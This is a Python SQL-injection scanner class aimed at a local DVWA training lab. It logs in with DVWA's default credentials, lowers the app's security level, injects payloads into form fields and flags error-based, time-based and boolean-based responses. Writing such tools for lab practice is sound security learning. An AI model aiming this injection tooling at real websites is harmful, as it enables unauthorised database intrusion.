import requests
import time
from bs4 import BeautifulSoup

class SQLInjector:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.base_url = "http://localhost/DVWA/login.php"
        self.login()

    def login(self):
        resp = self.session.get(self.base_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        user_token = soup.find("input", {"name": "user_token"})["value"]

        self.session.post(
            self.base_url,
            data={
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": user_token
            }
        )
        self.session.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")

    def send_payload(self, form, payload):
        url = form["action"]
        method = form["method"]
        data = {}

        for field in form["inputs"]:
            if field["name"].lower() != "user_token":
                data[field["name"]] = payload
            else:
                data[field["name"]] = field["value"] 

        try:
            start = time.time()
            if method == "post":
                r = self.session.post(url, data=data, timeout=self.timeout)
            else:
                r = self.session.get(url, params=data, timeout=self.timeout)
            
            delay = time.time() - start
            return self.analyze_response(r, delay, form.get("baseline_len", 0))
        except Exception as e:
            return f"Error: {str(e)}"

    def analyze_response(self, response, delay, baseline_len):
        text = response.text.lower()
        
        if "login.php" in response.url:
            return "Session Expired/Redirected"
            
        if any(msg in text for msg in ["sql syntax", "mysql_fetch", "driver error"]):
            return "VULNERABLE: SQL Error Detected"

        if delay > 4:
            return "VULNERABLE: Time-based delay"

        if baseline_len > 0 and abs(len(response.text) - baseline_len) > 50:
            return "Potential Boolean-based Bypass"

        return "Normal response"